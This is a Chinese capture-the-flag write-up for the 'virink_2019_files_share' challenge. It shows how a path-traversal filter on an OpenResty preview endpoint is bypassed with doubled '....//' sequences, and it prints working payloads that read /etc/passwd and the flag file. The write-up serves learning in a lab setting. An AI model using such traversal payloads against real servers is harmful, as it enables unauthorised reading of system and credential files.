# virink\_2019\_files\_share

## virink\_2019\_files\_share

## 考点

* 目录扫描
* 任意文件下载
* 目录穿越
* Lua代码

## wp

提示`flag in f1ag_Is_h3re`，还提示是个脑洞题

index.gk这个后缀不知道什么东西，有两个js文件index.js和three.min.js，应该是魔方的源码。

看了一下响应头，服务器是openresty，它是一个基于 NGINX 的可伸缩的 Web 平台，可以使用 Lua 脚本语言调动 Nginx 支持的各种 C 以及 Lua 模块。

![](<../.gitbook/assets/image (12).png>)

扫描发现存在/uploads/目录，有个Preview文件，下载下来看看，没发现什么东西

![](<../.gitbook/assets/image (8) (1) (1).png>)

下载链接格式如下，`http://90baaf07-a12e-437c-9470-dadb233172f2.node4.buuoj.cn:81/preview?f=favicon.ico`，尝试任意文件下载

`/preview?f=../index.gk`提示`File index.gk not found!`

`/preview?f=../index.gk/`提示`File index. not found!`

好像把`.`，`/`，`../`替换成空了，使用重写绕过

`/preview?f=....//....//....//....//....//....//....//etccc//passwd`可以看到`/etc/passwd`

![](<../.gitbook/assets/image (30).png>)

payload：

```
/preview?f=....//....//....//....//....//....//....//f1ag_Is_h3reee//flag
```

直接访问即可

看了一下[GitHub的代码](https://github.com/CTFTraining/virink\_2019\_web\_files\_share/blob/master/src/preview.lua)，代码只过滤了`../`，和题目好像不一样。

## 小结

1. openresty可能是有lua文件
2. 下载要注意链接，是不是存在任意文件下载
